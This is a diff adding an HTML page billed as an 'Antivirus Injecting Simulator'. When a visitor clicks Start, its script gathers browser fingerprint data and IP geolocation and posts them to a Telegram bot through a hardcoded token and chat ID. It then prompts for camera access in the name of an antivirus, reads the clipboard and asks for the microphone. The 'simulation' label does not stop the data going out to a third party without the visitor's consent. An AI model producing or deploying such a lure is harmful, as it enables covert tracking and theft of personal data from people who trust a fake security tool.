@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Antivirus Injecting Simulator - By Ali Hosen</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212; /* Darker background */
+            color: #0f0; /* Green text */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .container {
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 25px rgba(0, 255, 0, 0.35);
+            width: 90%;
+            max-width: 700px; /* Slightly wider for more info */
+        }
+        h1 {
+            color: #0f0;
+            border-bottom: 2px solid #0f0;
+            padding-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        h1 .fa-shield-virus {
+            margin-right: 10px;
+            font-size: 1.2em;
+        }
+        button {
+            background-color: #0a0;
+            color: #1e1e1e;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        button:hover {
+            background-color: #0f0;
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        button .fas {
+            margin-right: 8px;
+        }
+        .status-log {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #000; /* Black terminal-like bg */
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            text-align: left;
+            max-height: 250px; /* Increased height */
+            overflow-y: auto;
+            font-family: 'Consolas', 'Courier New', Courier, monospace; /* Monospaced font */
+            font-size: 0.9em;
+        }
+        .status-log p {
+            margin: 5px 0;
+            word-break: break-all;
+        }
+        .status-log p .fas {
+            margin-right: 5px;
+            color: #0f0; /* Ensure icons are green */
+        }
+        .disclaimer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #aaa;
+        }
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8); /* Darker overlay */
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .popup-content {
+            background-color: #1e1e1e;
+            padding: 30px; /* More padding */
+            border-radius: 8px;
+            border: 1px solid #0f0;
+            color: #0f0;
+            text-align: center;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+        .popup-content h2 .fas {
+            margin-right: 10px;
+        }
+        .popup-content button {
+            margin-top: 20px;
+            padding: 12px 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><i class="fas fa-shield-virus"></i>Antivirus Injecting </h1>
+        <p>Developed by: Ali Hosen </p>
+        
+        <button id="startButton"><i class="fas fa-play"></i>Start </button>
+        
+        <div class="status-log" id="statusLog">
+            <p><i class="fas fa-hourglass-start"></i>Status: Waiting to start...</p>
+        </div>
+    </div>
+
+    <div class="popup-overlay" id="warningPopup">
+        <div class="popup-content">
+            <h2><i class="fas fa-exclamation-triangle"></i>Warning!</h2>
+            <p> Proceed with caution.</p>
+            <button id="proceedWarning"><i class="fas fa-check-circle"></i>Proceed</button>
+        </div>
+    </div>
+
+    <div class="popup-overlay" id="injectingPopup">
+        <div class="popup-content">
+            <h2 id="injectingTitle"><i class="fas fa-syringe"></i>Injecting...</h2>
+            <p id="injectingMessage">Please wait while the process .</p>
+            
+        </div>
+    </div>
+
+    
+
+    <script>
+        const startButton = document.getElementById('startButton');
+        const statusLog = document.getElementById('statusLog');
+        const warningPopup = document.getElementById('warningPopup');
+        const proceedWarningButton = document.getElementById('proceedWarning');
+        const injectingPopup = document.getElementById('injectingPopup');
+        const injectingTitle = document.getElementById('injectingTitle');
+        const injectingMessage = document.getElementById('injectingMessage');
+
+        const TELEGRAM_BOT_TOKEN = '7501055809:AAHybTQCakGqgj45Z88HzY3GdT7H-MhzC58'; 
+        const TELEGRAM_CHAT_ID = '7945358964';   
+
+        function logStatus(message, iconClass = 'fas fa-info-circle') {
+            const p = document.createElement('p');
+            const icon = document.createElement('i');
+            icon.className = iconClass;
+            p.appendChild(icon);
+            p.appendChild(document.createTextNode(` [${new Date().toLocaleTimeString()}] ${message}`));
+            statusLog.appendChild(p);
+            statusLog.scrollTop = statusLog.scrollHeight;
+            console.log(message);
+        }
+
+        function showPopup(popupElement) {
+            popupElement.style.display = 'flex';
+        }
+
+        function hidePopup(popupElement) {
+            popupElement.style.display = 'none';
+        }
+
+        async function sendToTelegram(data) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
+                logStatus('Telegram Bot Token or Chat ID not configured. Skipping sending info.', 'fas fa-exclamation-triangle');
+                return;
+            }
+
+            let message = `🛡️ Antivirus Injecting Simulator Log:\n`;
+            message += `-----------------------------------\n`;
+            message += `🕒 Timestamp: ${data.time}\n`;
+            message += `🔗 URL: ${data.url}\n\n`;
+            message += `🖥️ Device Info:\n`;
+            message += `  User Agent: ${data.deviceInfo.userAgent}\n`;
+            message += `  Platform: ${data.deviceInfo.platform}\n`;
+            message += `  Language: ${data.deviceInfo.language}\n`;
+            message += `  Screen: ${data.deviceInfo.screenResolution}\n`;
+            message += `  CPU Cores: ${data.deviceInfo.cpuCores || 'N/A'}\n`;
+            message += `  Device Memory (GB): ${data.deviceInfo.deviceMemory || 'N/A'}\n`;
+            message += `  Touch Support: ${data.deviceInfo.touchSupport ? 'Yes' : 'No'}\n`;
+            message += `  Cookies Enabled: ${data.deviceInfo.cookiesEnabled ? 'Yes' : 'No'}\n`;
+            message += `  Online: ${data.deviceInfo.onlineStatus ? 'Yes' : 'No'}\n\n`;
+            message += `🌐 IP Info:\n`;
+            message += `  IP Address: ${data.ipInfo.ip || 'N/A'}\n`;
+            message += `  City: ${data.ipInfo.city || 'N/A'}\n`;
+            message += `  Region: ${data.ipInfo.region || 'N/A'}\n`;
+            message += `  Country: ${data.ipInfo.country_name || 'N/A'}\n`;
+            message += `  ISP: ${data.ipInfo.org || 'N/A'}\n`;
+            message += `-----------------------------------`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    logStatus('Information sent to Telegram successfully.', 'fas fa-paper-plane');
+                } else {
+                    logStatus(`Failed to send to Telegram: ${result.description}`, 'fas fa-times-circle');
+                }
+            } catch (error) {
+                logStatus(`Error sending to Telegram: ${error.message}`, 'fas fa-times-circle');
+            }
+        }
+
+        async function getIpInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                return await response.json();
+            } catch (error) {
+                logStatus(`Error fetching IP info: ${error.message}`, 'fas fa-wifi-slash'); // Custom icon for network error
+                return { ip: 'N/A', city: 'N/A', region: 'N/A', country_name: 'N/A', org: 'N/A' };
+            }
+        }
+        
+        async function requestCameraAccess() {
+            logStatus('Requesting Camera Access...', 'fas fa-camera');
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                logStatus('Camera API (getUserMedia) not supported by this browser.', 'fas fa-times-circle');
+                alert('Camera API (getUserMedia) not supported by this browser.');
+                return false;
+            }
+            if (confirm('Antivirus wants to access your camera. Allow? ')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    logStatus('Camera access granted (simulated). Stream acquired.', 'fas fa-video');
+                    stream.getTracks().forEach(track => track.stop());
+                    return true;
+                } catch (err) {
+                    logStatus(`Camera access denied or error: ${err.name} - ${err.message}`, 'fas fa-video-slash');
+                    return false;
+                }
+            } else {
+                logStatus('Camera access permission declined by user.', 'fas fa-hand-paper');
+                return false;
+            }
+        }
+
+        async function requestRealClipboardReadAccess() {
+            logStatus('Requesting Clipboard Read Access...', 'fas fa-paste');
+            if (!navigator.clipboard || !navigator.clipboard.readText) {
+                logStatus('Clipboard API (readText) not supported or not available in this context (e.g., non-HTTPS).', 'fas fa-times-circle');
+                alert('Clipboard API (readText) not supported or not available in this context (e.g., non-HTTPS). Try running on localhost or HTTPS.');
+                return false;
+            }
+            try {
+                // Browser will likely show its own permission prompt here if needed.
+                const text = await navigator.clipboard.readText();
+                if (text) {
+                    logStatus(`Clipboard content read successfully. Length: ${text.length}. (Content not displayed for privacy in log).`, 'fas fa-check-circle');
+                    alert(`Simulator read from clipboard (simulated):\n"${text.substring(0, 50)}${text.length > 50 ? '...' : ''}"`);
+                } else {
+                    logStatus('Clipboard is empty or access yielded no text.', 'fas fa-clipboard');
+                }
+                return true;
+            } catch (err) {
+                if (err.name === 'NotAllowedError') {
+                    logStatus('Clipboard read permission denied by user.', 'fas fa-hand-paper');
+                } else {
+                    logStatus(`Error reading clipboard: ${err.name} - ${err.message}`, 'fas fa-times-circle');
+                    alert(`Could not read from clipboard: ${err.name}. This might be due to permissions or browser security settings.`);
+                }
+                return false;
+            }
+        }
+
+        async function requestAudioAccess() {
+            logStatus('Requesting Audio Access...', 'fas fa-microphone');
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                logStatus('Audio API (getUserMedia) not supported by this browser.', 'fas fa-times-circle');
+                alert('Audio API (getUserMedia) not supported by this browser.');
+                return false;
+            }
+            if (confirm('Simulator wants to access your microphone. Allow? (This is part of the simulation)')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    logStatus('Audio access granted (simulated). Stream acquired.', 'fas fa-volume-up');
+                    stream.getTracks().forEach(track => track.stop());
+                    return true;
+                } catch (err) {
+                    logStatus(`Audio access denied or error: ${err.name} - ${err.message}`, 'fas fa-microphone-slash');
+                    return false;
+                }
+            } else {
+                logStatus('Audio access permission declined by user (simulated).', 'fas fa-hand-paper');
+                return false;
+            }
+        }
+        
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function runSimulation() {
+            startButton.disabled = true;
+            startButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i>Simulation in Progress...';
+            statusLog.innerHTML = ''; // Clear previous logs
+            logStatus('Starting simulation...', 'fas fa-cogs');
+
+            // 1. Collect Info
+            logStatus('Collecting device and network information...', 'fas fa-search-location');
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                cpuCores: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory, // May be undefined or an estimate
+                touchSupport: ('ontouchstart' in window || navigator.maxTouchPoints > 0),
+                cookiesEnabled: navigator.cookieEnabled,
+                onlineStatus: navigator.onLine,
+            };
+            const ipInfo = await getIpInfo();
+            const currentTime = new Date().toLocaleString();
+            const currentUrl = window.location.href;
+
+            const collectedData = {
+                time: currentTime,
+                url: currentUrl,
+                deviceInfo: deviceInfo,
+                ipInfo: ipInfo,
+            };
+            logStatus('Information collection complete.', 'fas fa-check-double');
+            await delay(500);
+
+            // 2. Send to Telegram
+            logStatus('Preparing to send information to Telegram...', 'fas fa-share-square');
+            await sendToTelegram(collectedData);
+            await delay(500);
+            
+            // 3. Warning Popup
+            logStatus('Displaying warning...', 'fas fa-triangle-exclamation');
+            showPopup(warningPopup);
+            await new Promise(resolve => {
+                proceedWarningButton.onclick = () => {
+                    hidePopup(warningPopup);
+                    resolve();
+                };
+            });
+            logStatus('Warning acknowledged.', 'fas fa-thumbs-up');
+            await delay(500);
+
+            // 4. "Injecting..." message
+            injectingTitle.innerHTML = '<i class="fas fa-syringe"></i>Injecting...';
+            injectingMessage.textContent = 'Please wait while the process is simulated.';
+            showPopup(injectingPopup); 
+            await delay(1500);
+
+            // 5. Camera Access
+            hidePopup(injectingPopup);
+            await requestCameraAccess();
+            await delay(1000);
+
+            // 6. Clipboard "Read" Access
+            showPopup(injectingPopup); // Show "Injecting..." again or a new message for this step
+            injectingMessage.textContent = 'Attempting clipboard access...';
+            await delay(500);
+            hidePopup(injectingPopup);
+            await requestRealClipboardReadAccess(); // This is the new clipboard access
+            await delay(1000);
+
+            // 7. Audio Access
+            showPopup(injectingPopup);
+            injectingMessage.textContent = 'Requesting audio permissions...';
+            await delay(500);
+            hidePopup(injectingPopup);
+            await requestAudioAccess();
+            await delay(1000);
+
+            logStatus('Simulation sequence complete.', 'fas fa-flag-checkered');
+            
+            injectingTitle.innerHTML = '<i class="fas fa-check-circle"></i>Simulation Complete';
+            injectingMessage.textContent = 'All simulated steps have been executed.';
+            showPopup(injectingPopup);
+            
+            const existingCloseButton = injectingPopup.querySelector('.popup-content button');
+            if (existingCloseButton) {
+                existingCloseButton.remove();
+            }
+
+            const closeFinalPopupButton = document.createElement('button');
+            closeFinalPopupButton.innerHTML = '<i class="fas fa-times"></i>Close';
+            closeFinalPopupButton.onclick = () => {
+                hidePopup(injectingPopup);
+                startButton.disabled = false;
+                startButton.innerHTML = '<i class="fas fa-play"></i>Start Simulation';
+            };
+            injectingPopup.querySelector('.popup-content').appendChild(closeFinalPopupButton);
+        }
+
+        startButton.addEventListener('click', runSimulation);
+
+        logStatus('Antivirus Injecting Simulator initialized. Ready to start.', 'fas fa-power-off');
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
+            logStatus('WARNING: Telegram Bot Token or Chat ID is not set. Information will not be sent to Telegram.', 'fas fa-exclamation-triangle');
+        }
+        if (window.isSecureContext === false && location.protocol !== 'file:') {
+             logStatus('WARNING: Page is not loaded over HTTPS. Clipboard API and other features might not work as expected.', 'fas fa-lock');
+        } else if (location.protocol === 'file:') {
+            logStatus('INFO: Page loaded via file:// protocol. For full functionality (like Clipboard API), run it on a local web server (e.g., localhost).', 'fas fa-folder-open');
+        }
+
+
+    </script>
+</body>
+</html>
